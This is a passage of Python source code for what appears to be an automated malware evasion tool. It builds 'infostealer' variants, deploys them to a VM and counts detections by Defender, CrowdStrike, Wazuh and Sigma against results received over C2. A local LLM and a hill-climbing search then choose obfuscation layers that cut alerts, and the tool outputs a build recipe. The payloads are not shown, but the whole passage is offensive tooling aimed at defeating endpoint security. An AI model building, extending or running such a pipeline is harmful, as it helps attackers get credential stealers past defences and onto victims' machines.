            deploy_batch.append((config.copy(), parsed_dets if parsed_dets else []))

            if len(deploy_batch) >= batch_size:
                _apply_batch_strategy(
                    deploy_batch, all_layers, malware_type, llm_url,
                    strategy_history, locked, suggested, suggest_idx,
                    last_clean_config, resets_done, llm_calls, batch_num)
                llm_calls += 1
                batch_num += 1
                resets_done = strategy_history[-1].get("_resets_done", resets_done) if strategy_history else resets_done
                deploy_batch = []

    if deploy_batch:
        _apply_batch_strategy(
            deploy_batch, all_layers, malware_type, llm_url,
            strategy_history, locked, suggested, suggest_idx,
            last_clean_config, resets_done, llm_calls, batch_num)

    print(f"\n{'='*60}", flush=True)
    print(f"  FAILED after {max_rounds} rounds", flush=True)
    print(f"  Runs: {''.join(results_log)}", flush=True)
    counts = {"S": 0, "X": 0, "E": 0, "?": 0, "D": 0, "W": 0, "R": 0, "F": 0}
    for r in results_log:
        counts[r] = counts.get(r, 0) + 1
    parts = []
    if counts["S"]: parts.append(f"{counts['S']} success")
    if counts["X"]: parts.append(f"{counts['X']} detected (Defender)")
    if counts["F"]: parts.append(f"{counts['F']} detected (CrowdStrike)")
    if counts["W"]: parts.append(f"{counts['W']} detected (Wazuh)")
    if counts["R"]: parts.append(f"{counts['R']} detected (Sigma)")
    if counts["E"]: parts.append(f"{counts['E']} build error")
    if counts["?"]: parts.append(f"{counts['?']} no C2 data")
    if parts:
        print(f"  Summary: {', '.join(parts)}", flush=True)
    print(f"{'='*60}", flush=True)
    return False, config, max_rounds, load_history()


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "--run":
        import argparse as _ap
        _p = _ap.ArgumentParser(prog="evasion_selector --run")
        _p.add_argument("malware_type", nargs="?", default="infostealer")
        _p.add_argument("--dry-run", action="store_true")
        _p.add_argument("--use-sim", action="store_true",
                        help="Run simulation hill-climb before real deployment")
        _p.add_argument("--max-rounds", type=int, default=None)
        _p.add_argument("--batch-size", type=int, default=None)
        _p.add_argument("--llm-url", default=None)
        _a = _p.parse_args(sys.argv[2:])
        max_rounds = _a.max_rounds if _a.max_rounds is not None else int(os.environ.get("MALGEN_MAX_ROUNDS", "50"))
        batch_size = _a.batch_size if _a.batch_size is not None else int(os.environ.get("MALGEN_BATCH_SIZE", "3"))
        llm_url = _a.llm_url or os.environ.get("LLM_URL", None)
        vm_port = int(os.environ.get("VM_PORT", "10022"))
        vm_user = os.environ.get("VM_USER", "vmuser")
        vm_pass = os.environ.get("VM_PASS", "vmuser123")
        c2_port = int(os.environ.get("C2_PORT", "9001"))
        ok, cfg, runs, hist = run_hybrid_loop(
            malware_type=_a.malware_type, dry_run=_a.dry_run,
            max_rounds=max_rounds, batch_size=batch_size, use_sim=_a.use_sim,
            llm_url=llm_url, vm_port=vm_port, vm_user=vm_user, vm_pass=vm_pass,
            c2_port=c2_port,
        )

    elif len(sys.argv) > 1 and sys.argv[1] == "--sim-only":
        mtype = sys.argv[2] if len(sys.argv) > 2 else "infostealer"
        llm_url = os.environ.get("LLM_URL", "http://localhost:11235")
        for i, a in enumerate(sys.argv):
            if a == "--llm-url" and i + 1 < len(sys.argv):
                llm_url = sys.argv[i + 1]
        print(f"\n  Simulation-only mode: {mtype}", flush=True)
        from test_evasion_loop import evaluate_config
        al = get_all_layers(mtype)
        start_config = {}
        for layer, info in al.items():
            start_config[layer] = info["default"]
        start_config = apply_constraints(start_config, mtype)
        start_dets = evaluate_config(start_config, mtype, max_level=20, exam_name="A")
        print(f"  Default config: {len(start_dets)} simulated alerts", flush=True)
        print(f"  Running hill-climb...", flush=True)
        best_config, best_alerts, evals = _sim_hill_climb(
            start_config, mtype, al, evaluate_config,
            max_evals=2000, max_restarts=30)
        print(f"  Hill-climb: {best_alerts} alerts in {evals} evals", flush=True)
        if best_alerts > 0:
            print(f"  Running LLM correlation...", flush=True)
            try:
                batch = _sim_build_correlation_batch(best_config, mtype, al, evaluate_config)
                strategy = _llm_strategy_call(
                    llm_url, batch, al, None, 20, mtype, [], {}, 0, base_config=best_config)
                changes = strategy.get("changes", {})
                if changes:
                    for dim, val in changes.items():
                        best_config[dim] = val
                    best_config = apply_constraints(best_config, mtype)
                    final_dets = evaluate_config(best_config, mtype, max_level=20, exam_name="A")
                    print(f"  LLM: {len(changes)} changes -> {len(final_dets)} alerts", flush=True)
                    print(f"  Changes: {changes}", flush=True)
            except Exception as e:
                print(f"  LLM error: {e}", flush=True)
        print(f"\n  Final config:", flush=True)
        print(format_selection_report(best_config, mtype))
        try:
            recipe = config_to_recipe(best_config, mtype)
            print(f"  Recipe: {len(recipe.splitlines())} lines OK", flush=True)
        except Exception as e:
            print(f"  Recipe error: {e}", flush=True)

    elif len(sys.argv) > 1 and sys.argv[1] == "--test":
        mtype = sys.argv[2] if len(sys.argv) > 2 else "infostealer"
        detection = "Trojan:Win32/Stealer.G!MTB - Behavior:Win32/SuspiciousProcess"
        print(f"Testing {mtype} with detection:", detection, "\n")
        config = select_layers(detection, malware_type=mtype)
        print(format_selection_report(config, mtype))

    elif len(sys.argv) > 1 and sys.argv[1] == "--detection":
        detection = sys.argv[2] if len(sys.argv) > 2 else ""
        mtype = sys.argv[3] if len(sys.argv) > 3 else "infostealer"
        config = select_layers(detection, malware_type=mtype)
        print(format_selection_report(config, mtype))

    else:
        universal = 1
        for info in LAYERS.values():
            universal *= len(info["options"])
        print(f"Evasion Selector — Combination Space")
        print(f"  Universal layers: {len(LAYERS)} layers, {universal:,} combinations")
        for mtype, type_layers in TYPE_LAYERS.items():
            type_combos = universal
            type_layer_count = 0
            for tl_info in type_layers.values():
                type_combos *= len(tl_info["options"])
                type_layer_count += 1
            total_layers = len(LAYERS) + type_layer_count
            print(f"  {mtype}: {total_layers} layers, {type_combos:,.0f} combinations")
        print()
        print("Usage:")
        print("  --run [type]                    Run evasion loop v5 (real detection)")
        print("  --run [type] --dry-run          Simulate without VM deploy")
        print("  --run [type] --max-rounds 10    Max deploy-detect-adapt rounds")
        print("  --run [type] --use-sim          Pre-screen with sim before real deploy")
        print("  --run [type] --llm-url URL      Local LLM endpoint")
        print("  --sim-only [type]               Simulation only (no VM, detection model)")
        print("  --test                          Test with sample detection")
        print("  --detection 'text'              Show selection for detection text")
        history = load_history()
        print(f"\nHistory: {len(history.get('runs', []))} runs, "
              f"{len(history.get('successes', []))} successes, "
              f"{len(history.get('detections', []))} detections")
